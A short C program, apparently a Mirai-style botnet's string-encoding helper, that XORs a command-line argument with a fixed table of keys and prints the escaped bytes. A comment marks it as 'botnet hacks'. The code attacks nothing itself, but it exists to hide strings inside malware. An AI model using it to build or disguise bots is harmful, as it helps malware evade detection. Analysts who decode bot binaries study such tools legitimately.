#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>

/* lalalala big botnet hacks */
uint32_t table_keys[] = {0x5a379362, 0x4f08cb76, 0x35c5646f, 0x134af387, 0x5f21e986, 0x5799d57f, 0x1d63515b, 0x23d6d77e, 0x191f576d, 0x2cc513bb, 0x7375f0e9, 0x399d94af, 0x2f1e9237, 0x56468c33, 0x53878531, 0x3dbb1410, 0x39edc189, 0x332cd761, 0x1ef0c0e8, 0x34ce7f8e,};

#define TABLE_KEY_LEN (sizeof(table_keys) / sizeof(*table_keys))

void add_entry(char *buf, int buf_len) {
    char *cpy = malloc(buf_len + 1);
    strcpy(cpy, buf);

    for (int i = 0; i < TABLE_KEY_LEN; i++) {
        uint32_t table_key = table_keys[i];

        uint8_t k1 = table_key & 0xff,
                k2 = (table_key >> 8) & 0xff,
                k3 = (table_key >> 16) & 0xff,
                k4 = (table_key >> 24) & 0xff;


        for (int i = 0; i < buf_len; i++) {
            cpy[i] ^= k1;
            cpy[i] ^= k2;
            cpy[i] ^= k3;
            cpy[i] ^= k4;
        }
    }

    printf("XOR'd %d bytes: '", buf_len);

    for (int i = 0; i < buf_len; i++) {
        printf("\\x%x", (uint8_t)cpy[i]);
    }
    puts("'");
}

/* HUH */
int main(int argc, char **args) {
    add_entry(args[1], strlen(args[1]));
}
